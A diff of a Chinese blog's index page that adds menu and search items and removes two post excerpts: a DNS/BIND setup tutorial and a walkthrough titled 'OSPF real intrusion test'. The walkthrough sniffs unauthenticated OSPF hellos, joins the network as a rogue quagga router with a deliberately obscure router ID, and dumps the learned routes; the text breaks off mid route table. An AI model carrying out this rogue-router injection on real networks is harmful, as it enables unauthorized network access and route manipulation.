@@ -75,10 +75,19 @@
         </li>
       
         <li class="menu-item">
-          <a class="menu-item-link" href="/archives/">
+          <a class="menu-item-link" href="/archives">
             
             
               归档
+            
+          </a>
+        </li>
+      
+        <li class="menu-item">
+          <a class="menu-item-link" href="/categories">
+            
+            
+              分类
             
           </a>
         </li>
@@ -101,6 +110,14 @@
           </a>
         </li>
       
+      
+        <li class="menu-search">
+          <form>
+            <i class="iconfont icon-search" id="open-search"></i>
+            <input type="text" class="search-input" id="search-input" />
+            <i class="iconfont icon-close" id="close-search"></i>
+          </form>
+        </li>
       
     </ul>
   
@@ -127,10 +144,17 @@
         
       </a>
     
-      <a class="mobile-menu-item" href="/archives/">
+      <a class="mobile-menu-item" href="/archives">
         
         
           归档
+        
+      </a>
+    
+      <a class="mobile-menu-item" href="/categories">
+        
+        
+          分类
         
       </a>
     
@@ -163,932 +187,6 @@
     <header class="post-header">
       <h1 class="post-title">
         
-          <a class="post-link" href="/2016/07/17/基础DNS学习/">基础DNS学习</a>
-        
-      </h1>
-
-      <div class="post-meta">
-        <span class="post-time">
-          2016年7月17日
-        </span>
-      </div>
-    </header>
-
-    
-
-    <div class="post-content">
-      
-        
-
-        
-          <h3 id="1-常用命令"><a href="#1-常用命令" class="headerlink" title="1. 常用命令"></a>1. 常用命令</h3><h4 id="nslookup"><a href="#nslookup" class="headerlink" title="nslookup"></a>nslookup</h4><p>查询域名命令，Windows自带该工具，Linux一般自带，有一些distribution没有，可以通过如下命令安装该工具。可以列出查询出来的IP，可以执行正解和反解查询。</p>
-<p>Ubuntu:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo apt-get install dnsutils</div></pre></td></tr></table></figure>
-<p>Debian:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">apt-get update</div><div class="line">apt-get install dnsutils</div></pre></td></tr></table></figure>
-<p>Fedora / Centos:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">yum install bind-utils</div></pre></td></tr></table></figure>
-<h4 id="dig"><a href="#dig" class="headerlink" title="dig"></a>dig</h4><p>使用方法，可以执行正解和反解。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">dig [options] FQDN [@server]</div></pre></td></tr></table></figure>
-<p>输出说明</p>
-<ul>
-<li>QUESTION（问题）: 要查询的IP</li>
-<li>ANSWER（回答）: 应答结果</li>
-<li>AUTHORITY（验证）: 哪个DNS给出的回答。</li>
-</ul>
-<h4 id="whois"><a href="#whois" class="headerlink" title="whois"></a>whois</h4><p>查询领域设定，管理者是谁。</p>
-<h4 id="host"><a href="#host" class="headerlink" title="host"></a>host</h4><p>把一个主机名解析到一个网际地址或把一个网际地址解析到一个主机名</p>
-<hr>
-<h3 id="2-DNS记录类型"><a href="#2-DNS记录类型" class="headerlink" title="2. DNS记录类型"></a>2. DNS记录类型</h3><h4 id="正解"><a href="#正解" class="headerlink" title="正解"></a>正解</h4><p>正解符合规范即可设定，取得域名授权就可以设定。</p>
-<table>
-<thead>
-<tr>
-<th>domain</th>
-<th>IN</th>
-<th>RR type</th>
-<th>RR data</th>
-<th>command</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>主机名.</td>
-<td>IN</td>
-<td>A</td>
-<td>IPv4 的 IP 地址</td>
-<td>dig [-t a] domain</td>
-</tr>
-<tr>
-<td>主机名.</td>
-<td>IN</td>
-<td>AAAA</td>
-<td>IPv6 的 IP 地址</td>
-<td>dig -t aaaa domain</td>
-</tr>
-<tr>
-<td>领域名.</td>
-<td>IN</td>
-<td>NS</td>
-<td>管理域名的服务器主机名字</td>
-<td>dig -t ns domain</td>
-</tr>
-<tr>
-<td>领域名.</td>
-<td>IN</td>
-<td>SOA</td>
-<td>管理域名的七个重要参数</td>
-<td>dig -t soa domain</td>
-</tr>
-<tr>
-<td>领域名.</td>
-<td>IN</td>
-<td>MX</td>
-<td>接收邮件的服务器主机名字</td>
-<td>dig -t mx domain</td>
-</tr>
-<tr>
-<td>主机别名.</td>
-<td>IN</td>
-<td>CNAME</td>
-<td>代表主机别名的主机名字</td>
-<td>dig domain</td>
-</tr>
-</tbody>
-</table>
-<blockquote>
-<p><span style="color:red"><strong>提示：</strong></span> domain一列后面一定要加一个.，例如www.test.com的格式为www.test.com.</p>
-</blockquote>
-<p>SOA七个重要参数</p>
-<ol>
-<li><strong>Master DNS 服务器主机名：</strong>这个领域主要是哪部 DNS 作为 master 的意思</li>
-<li><strong>管理员的 email</strong>：那么管理员的 email 为何？发生问题可以联络这个管理员。要注意的是， 由于 @ 在数据库档案中是有特别意义的，所以改为.。</li>
-<li><strong>序号 (Serial)</strong>：这个序号代表的是这个数据库档案的新旧，序号越大代表越新。 当 slave 要判断是否主动下载新的数据库时，就以序号是否比 slave 上的还要新来判断，若是则下载，若不是则不下载。 所以当你修订了数据库内容时，记得要将这个数值放大才行！ 为了方便用户记忆，通常序号都会使用日期格式『YYYYMMDDNU』来记忆，例如昆山科大的 2010080369 序号代表 2010/08/03当天的第 69 次更新的感觉。不过，序号不可大于 2 的 32 次方，亦即必须小于 4294967296 才行。</li>
-<li><strong>更新频率 (Refresh)</strong>：那么啥时 slave 会去向 master 要求数据更新的判断？ 就是这个数值定义的。那每次 slave 去更新时， 如果发现序号没有比较大，那就不会下载数据库档案。</li>
-<li><strong>失败重新尝试时间 (Retry)</strong>：如果因为某些因素，导致 slave 无法对master 达成联机， 那么在多久的时间内，slave 会尝试重新联机到 master。</li>
-<li><strong>失效时间 (Expire)</strong>：如果一直失败尝试时间，持续联机到达这个设定值时限， 那么 slave 将不再继续尝试联机，并且尝试删除这份下载的 zone file 信息。</li>
-<li><strong>快取时间 (Minumum TTL)</strong>：如果这个数据库 zone file 中，每笔 RR 记录都没有写到 TTL 快取时间的话，那么就以这个 SOA 的设定值为主。</li>
-</ol>
-<h4 id="反解"><a href="#反解" class="headerlink" title="反解"></a>反解</h4><p>除非取得的是整个 class C 以上等级的 IP 网段，ISP 才有可能给 IP 反解授权。否则，若有反解的需求，就得要向直属上层 ISP 申请。</p>
-<table>
-<thead>
-<tr>
-<th>domain</th>
-<th>IN</th>
-<th>Type</th>
-<th>IP Address</th>
-<th>command</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>[ip反写].in-addr.arpa.</td>
-<td>IN</td>
-<td>PTR</td>
-<td>IP</td>
-<td>dig IP</td>
-</tr>
-</tbody>
-</table>
-<hr>
-<h3 id="3-DNS服务搭建"><a href="#3-DNS服务搭建" class="headerlink" title="3. DNS服务搭建"></a>3. DNS服务搭建</h3><p>安装bind套件，CentOS命令如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">yum install -y bind*</div></pre></td></tr></table></figure>
-<h4 id="转发DNS"><a href="#转发DNS" class="headerlink" title="转发DNS"></a>转发DNS</h4><p>只需要.这个zonefile的简单DNS服务器，只有快速搜索功能，没有本地主机IP正反解配置文件。需要指定一个上层DNS服务器。只需要编辑/etc/named.conf</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">vim /etc/named.conf</div><div class="line">  // 在预设的情况下，这个档案会去读取 /etc/named.rfc1912.zones 这个领域定义档</div><div class="line">  // 所以请记得要修改成底下的样式</div><div class="line">  options &#123;</div><div class="line">          listen-on port 53 &#123; any; &#125;;                                             //可不设定，代表全部接受</div><div class="line">          directory &quot;/var/named&quot;;                                              //数据库默认放置的目录所在</div><div class="line">          dump-file &quot;/var/named/data/cache_dump.db&quot;;         //一些统计信息</div><div class="line">          statistics-file &quot;/var/named/data/named_stats.txt&quot;;</div><div class="line">          memstatistics-file &quot;/var/named/data/named_mem_stats.txt&quot;;</div><div class="line">          allow-query &#123; any; &#125;;                                                    //可不设定，代表全部接受</div><div class="line">          recursion yes;                                                              //将自己视为客户端的一种查询模式</div><div class="line">          forward only;                                                               //可暂时不设定</div><div class="line">          forwarders &#123;                                                                //是重点！</div><div class="line">          168.95.1.1;                                                                  //先用中华电信的 DNS 当上层</div><div class="line">          139.175.10.20;                                                            //再用 seednet 当上层</div><div class="line">          &#125;;</div><div class="line">  &#125;;</div></pre></td></tr></table></figure>
-<p>启动服务，注意开启iptables的tcp和udp的53端口。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">service named start</div></pre></td></tr></table></figure>
-<h4 id="权威DNS-amp-递归DNS"><a href="#权威DNS-amp-递归DNS" class="headerlink" title="权威DNS &amp; 递归DNS"></a>权威DNS &amp; 递归DNS</h4><ul>
-<li><p>规划IP地址和域名对应关系</p>
-</li>
-<li><p>主配置文件 /etc/named.conf</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">vim  /etc/named.conf</div><div class="line">options &#123;</div><div class="line">	directory &quot;/var/named&quot;;</div><div class="line">	dump-file &quot;/var/named/data/cache_dump.db&quot;;</div><div class="line">	statistics-file &quot;/var/named/data/named_stats.txt&quot;;</div><div class="line">	memstatistics-file &quot;/var/named/data/named_mem_stats.txt&quot;;</div><div class="line">	allow-query &#123; any; &#125;;</div><div class="line">	recursion yes;</div><div class="line">	allow-transfer &#123; none; &#125;;      // 不许别人进行 zone 转移</div><div class="line">&#125;;</div><div class="line">zone &quot;.&quot; IN &#123;</div><div class="line">	type hint;</div><div class="line">	file &quot;named.ca&quot;;</div><div class="line">&#125;;</div><div class="line">zone &quot;ucas.edu.cn&quot; IN &#123;                // 这个 zone 的名称</div><div class="line">	type master;                         // 是什么类型</div><div class="line">	file &quot;named.ucas.edu.cn&quot;;    // 档案放在哪里</div><div class="line">&#125;;</div><div class="line">zone &quot;100.168.192.in-addr.arpa&quot; IN &#123;</div><div class="line">	type master;</div><div class="line">	file &quot;named.192.168.100&quot;;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
-<p>zone内相关参数说明</p>
-</li>
-</ul>
-<table>
-<thead>
-<tr>
-<th>设定值</th>
-<th style="text-align:left">意义</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>type</td>
-<td style="text-align:left">该 zone 的类型，主要的类型有针对 . 的 hint，以及自己手动修改数据库档案的 master，与可自动更新数据库的 slave。</td>
-</tr>
-<tr>
-<td>file</td>
-<td style="text-align:left">zonefile 的对应的名称</td>
-</tr>
-<tr>
-<td>反解zone</td>
-<td style="text-align:left">in-addr.arpa</td>
-</tr>
-</tbody>
-</table>
-<ul>
-<li><p>顶级.(root)数据库档案设定</p>
-<p>由INTERNIC 所管理维护的，全世界共有 13 部管理 . 的 DNS 服务器，在<code>/var/named/named.ca</code>中</p>
-</li>
-<li><p>正解数据库文件设置</p>
-<p>​     少应该要有 $TTL, SOA, NS (与这部 NS 主机名的 A)，仍以上面<code>/etc/named.conf</code>为例，在/var/named/配置文件named.ucas.edu.cn内容如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">$TTL 600</div><div class="line">@ IN SOA gsns.ucas.edu.cn. admin.www.ucas.edu.cn. (2011080401 3H 15M 1W 1D)</div><div class="line">@ IN NS gsns.ucas.edu.cn.                       #DNS服务器名称</div><div class="line">gsns.ucas.edu.cn. IN A 30.30.30.30           #DNS服务器IP地址</div><div class="line"></div><div class="line">@ IN MX 10 gsns.ucas.edu.cn.                  #域名邮件服务器</div><div class="line">										</div><div class="line">www.ucas.edu.cn. IN A 30.30.30.30           #相关正解</div><div class="line">linux.ucas.edu.cn. IN CNAME www.ucas.edu.cn.</div></pre></td></tr></table></figure>
-<blockquote>
-<p><span style="color:red">提示：</span> 域名后面有一个点，不要落下，例如<strong>www.ucas.edu.cn.</strong></p>
-</blockquote>
-</li>
-</ul>
-<ul>
-<li><p>反解数据库文件设置</p>
-<p>需要 $TTL, SOA, NS，正解里面有 A，反解里面则仅有 PTR 。另外，由于反解的 zone 名称是zz.yy.xx.in-addr.arpa.的模样，因此只要在反解里面要用到主机名时，192.168.100.0/24 这个网域的 DNS 反解则成为如/var/named/named.192.168.100所示。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">$TTL 600</div><div class="line">@ IN SOA gsns.ucas.edu.cn. admin.www.ucas.edu.cn. (2011080401 3H 15M 1W 1D)</div><div class="line">@ IN NS gsns.ucas.edu.cn.</div><div class="line">30 IN PTR gsns.ucas.edu.cn.</div><div class="line">254 IN PTR gate.ucas.edu.cn.</div><div class="line">30 IN PTR www.ucas.edu.cn.</div><div class="line">30 IN PTR linux.ucas.edu.cn.</div></pre></td></tr></table></figure>
-</li>
-<li><p>DNS启动</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">service named restart</div></pre></td></tr></table></figure>
-</li>
-</ul>
-<h4 id="授权子域"><a href="#授权子域" class="headerlink" title="授权子域"></a>授权子域</h4><ul>
-<li>需要在上层DNS服务器的zonefile内指定增加NS并指向下层DNS的主机名和IP（A）即可，zonefile的序号也需要增加。</li>
-<li>下层DNS服务器必须上层DNS所提供的可用子域名，并被上层DNS管理员所获知。</li>
-</ul>
-<p>假设上层DNS管理edu.cn这个域名。其对应的zonefile为<code>/var/named/named.edu.cn</code>，内容如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">$TTL 600</div><div class="line">@ IN SOA dns.edu.cn. admin.edu.cn. (2011080401 3H 15M 1W 1D)</div><div class="line">@ IN NS dns.edu.cn.</div><div class="line">dns.edu.cn. IN A 210.76.211.1</div><div class="line">@ IN MX 10 dns.edu.cn.</div><div class="line"></div><div class="line">ucas.edu.cn IN NS gsns.ucas.edu.cn      #子DNS服务器名称</div><div class="line">gsns.ucas.edu.cn IN A 30.30.30.30         #子DNS服务器IP地址</div></pre></td></tr></table></figure>
-<hr>
-<h3 id="4-相关操作"><a href="#4-相关操作" class="headerlink" title="4. 相关操作"></a>4. 相关操作</h3><h4 id="日志功能"><a href="#日志功能" class="headerlink" title="日志功能"></a>日志功能</h4><p>检查 /var/log/messages 的内容讯息 (极重要！)，</p>
-<h4 id="数据库更新"><a href="#数据库更新" class="headerlink" title="数据库更新"></a>数据库更新</h4><ul>
-<li>先针对要更改的那个 zone 的数据库档案去做更新，就是加入 RR 的标志即是！</li>
-</ul>
-<ul>
-<li>更改该 zone file 的序号 (Serial) ，就是那个 SOA 的第三个参数 (第一个数字)，因为这个数字会影响到 master/slave 的判定更新与否！</li>
-</ul>
-<ul>
-<li>重新启动 named ，或者是让 named 重新读取配置文件即可。</li>
-</ul>
-<h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><p>有待补充</p>
-<hr>
-<h3 id="5-实验测试"><a href="#5-实验测试" class="headerlink" title="5. 实验测试"></a>5. 实验测试</h3><h4 id="实验拓扑"><a href="#实验拓扑" class="headerlink" title="实验拓扑"></a>实验拓扑</h4><center> <img src="http://qingdao.icean.cc:11234/Imgbed/GNS3_DNS_learn/5-1.jpg" alt="5-1"></center><center style="color:purple"><strong>图5-1 实验拓扑</strong></center>
-
-<h4 id="设备信息"><a href="#设备信息" class="headerlink" title="设备信息"></a>设备信息</h4><table>
-<thead>
-<tr>
-<th>设备名</th>
-<th>端口</th>
-<th>IP地址</th>
-<th>备注</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>dns.edu.cn</td>
-<td>e2</td>
-<td>210.76.211.1/24</td>
-<td>管理edu.cn域名</td>
-</tr>
-<tr>
-<td>gsns.ucas.edu.cn</td>
-<td>e2</td>
-<td>30.30.30.30/24</td>
-<td>管理ucas.edu.cn域名，dns.edu.cn授权</td>
-</tr>
-<tr>
-<td>R1</td>
-<td>f1/1</td>
-<td>211.76.211.254/24</td>
-<td></td>
-</tr>
-<tr>
-<td>R1</td>
-<td>f1/0</td>
-<td>30.30.30.254/24</td>
-<td></td>
-</tr>
-<tr>
-<td>Winxp2</td>
-<td>e1</td>
-<td>30.30.30.2/24</td>
-<td>测试客户机</td>
-</tr>
-</tbody>
-</table>
-<h4 id="DNS测试"><a href="#DNS测试" class="headerlink" title="DNS测试"></a>DNS测试</h4><p>Winxp2的DNS地址为gsns.ucas.edu.cn时，可以进行nslookup测试，如图5-2所示</p>
-<center> <img src="http://qingdao.icean.cc:11234/Imgbed/GNS3_DNS_learn/5-2.jpg" alt="5-2"></center><center style="color:purple"><strong>图5-2 nslookup</strong></center>
-
-
-
-<p>在<strong>Winxp2</strong>上使用如下命令</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">dig www.ucas.edu.cn @210.76.211.1</div></pre></td></tr></table></figure>
-<p>在dns.edu.cn没有关闭递归查询的情况下，首先向gsns.ucas.edu.cn查询www.ucas.edu.cn，然后继续向根进行递归查询,因为实验环境是模拟环境,所以还无法确认,可以模拟使用虚拟机模拟根DNS服务器进行测试.</p>
-<p>在dns.edu.cn关闭递归查询的情况下，查询www.ucas.edu.cn, 然后返回结果给<strong>Winxp2</strong>为管理其域名的DNS服务器。</p>
-
-        
-      
-    </div>
-
-    
-  </article>
-
-    
-      
-  <article class="post">
-    <header class="post-header">
-      <h1 class="post-title">
-        
-          <a class="post-link" href="/2016/07/05/OSPF 真实入侵测试/">OSPF 真实入侵测试</a>
-        
-      </h1>
-
-      <div class="post-meta">
-        <span class="post-time">
-          2016年7月5日
-        </span>
-      </div>
-    </header>
-
-    
-
-    <div class="post-content">
-      
-        
-
-        
-          <h3 id="1-准备工作"><a href="#1-准备工作" class="headerlink" title="1. 准备工作"></a>1. 准备工作</h3><h4 id="抓包探测"><a href="#抓包探测" class="headerlink" title="抓包探测"></a>抓包探测</h4><ul>
-<li>使用Wireshark抓取到未链路验证的OSPF或者OSPFv3的hello数据包。</li>
-</ul>
-<h4 id="VirtualBox"><a href="#VirtualBox" class="headerlink" title="VirtualBox"></a>VirtualBox</h4><p>一台VirtualBox虚拟机需要接入到拓扑，虚拟机系统为CentOS6，有三块网卡，</p>
-<ul>
-<li>eth0为用于桥接到主机网卡，该网卡为抓取到OSPF或者OSPFv3的hello数据包的网卡</li>
-<li>eth1为host-only模式，用于本地宿主机通过xshell登录。</li>
-</ul>
-<h4 id="逻辑拓扑"><a href="#逻辑拓扑" class="headerlink" title="逻辑拓扑"></a>逻辑拓扑</h4><p>逻辑拓扑如下图所示，其实PC代表宿主机，Vigilante代表在宿主机中的虚拟机，虚拟机网卡eth0桥接到宿主机网卡。虚拟机系统为CentOS6，以安装配置好quagga。</p>
-<p>使用Wireshark抓包，抓到未加链路认证的ospf hello数据包</p>
-<center> <img src="http://qingdao.icean.cc:11234/Imgbed/OSPF_真实入侵测试/1-1.jpg" alt="1-1"></center><center style="color:purple"><strong>图1-1 逻辑拓扑</strong></center>
-
-<hr>
-<h3 id="2-入侵流程"><a href="#2-入侵流程" class="headerlink" title="2. 入侵流程"></a>2. 入侵流程</h3><h4 id="quagga服务器启动"><a href="#quagga服务器启动" class="headerlink" title="quagga服务器启动"></a>quagga服务器启动</h4><p>启动quagga相关的服务，zebra为模拟路由器的基本服务，ospfd为OSPF所需要的服务，偶是ospf6d为OSPFv3所需要的服务</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">service zebra start</div><div class="line">service ospfd start</div><div class="line">service ospf6d start</div></pre></td></tr></table></figure>
-<h4 id="配置OSPF"><a href="#配置OSPF" class="headerlink" title="配置OSPF"></a>配置OSPF</h4><p>输入路由配置模式</p>
-<figure class="highlight markdown"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">vtysh</div><div class="line">hostname# configure terminal</div><div class="line">hostname(config)# router ospf</div></pre></td></tr></table></figure>
-<p>配置路由id，应该选择一些比较冷僻的路由ID，避免和整个网络中其他OSPF路由ID重复，这里为2.2.2.178</p>
-<figure class="highlight markdown"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">hostname(config-router)# router-id 2.2.2.178</div></pre></td></tr></table></figure>
-<p>其中不用配置eth0的IP地址，因为eth0的地址已经DHCP获得了，添加在OSPF中的网络，其中网络地址根据获取的IP计算，area号根据之前抓取的hello包所得。</p>
-<figure class="highlight markdown"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">hostname(config-router)# network  10.30.7.0/21 area 4</div><div class="line">hostname(config-router)# do write</div></pre></td></tr></table></figure>
-<p>查看邻居关系，若结果有邻居关系且为full，说明建立了邻居关系，如果关系为init，需要多等待一会。</p>
-<figure class="highlight markdown"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Vigilante# show ip ospf  neighbor  </div><div class="line"> Neighbor ID Pri State           Dead Time Address         Interface            RXmtL RqstL DBsmL</div><div class="line">2.2.2.9          1 Full/DR           36.907s 30.30.30.254    eth2:30.30.30.1          0     0     0</div></pre></td></tr></table></figure>
-<p>当邻居关系为Full的时候，可以查看路由表了</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div><div class="line">221</div></pre></td><td class="code"><pre><div class="line">Vigilante# sh ipv6  route  </div><div class="line">Codes: K - kernel route, C - connected, S - static, R - RIPng, O - OSPFv3,</div><div class="line">       I - ISIS, B - BGP, * - FIB route.</div><div class="line"></div><div class="line">C&gt;* ::1/128 is directly connected, lo</div><div class="line">C&gt;* 2001:cc0:2020:4008::/64 is directly connected, eth0</div><div class="line">C * fe80::/64 is directly connected, eth1</div><div class="line">C&gt;* fe80::/64 is directly connected, eth0</div><div class="line">C&gt;* fec0::/64 is directly connected, eth1</div><div class="line">Vigilante# sh ip route  </div><div class="line">Codes: K - kernel route, C - connected, S - static, R - RIP, O - OSPF,</div><div class="line">       I - ISIS, B - BGP, &gt; - selected route, * - FIB route</div><div class="line"></div><div class="line">O   0.0.0.0/0 [110/1] via 10.211.7.254, eth0, 00:00:14</div><div class="line">K&gt;* 0.0.0.0/0 via 10.211.7.254, eth0</div><div class="line">O&gt;* 10.1.1.0/30 [110/14] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 10.3.3.0/30 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 10.4.1.0/30 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 10.10.10.0/30 [110/12] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 10.10.10.4/30 [110/12] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 10.10.10.8/30 [110/12] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 10.10.10.12/30 [110/12] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 10.10.10.16/30 [110/12] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 10.10.10.20/30 [110/12] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 10.10.10.24/30 [110/12] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 10.10.10.28/30 [110/12] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 10.10.10.32/30 [110/11] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 10.10.10.36/30 [110/12] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 10.10.10.40/30 [110/12] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 10.10.10.44/30 [110/12] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 10.10.10.48/30 [110/12] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 10.10.10.72/29 [110/1] via 10.211.7.254, eth0, 00:00:14</div><div class="line">O&gt;* 10.10.10.80/30 [110/12] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 10.10.10.84/30 [110/12] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 10.10.10.88/30 [110/12] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 10.10.10.92/30 [110/12] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 10.10.10.96/30 [110/13] via 10.211.7.254, eth0, 00:00:15</div><div class="line">O&gt;* 10.10.10.128/29 [110/1] via 10.211.7.254, 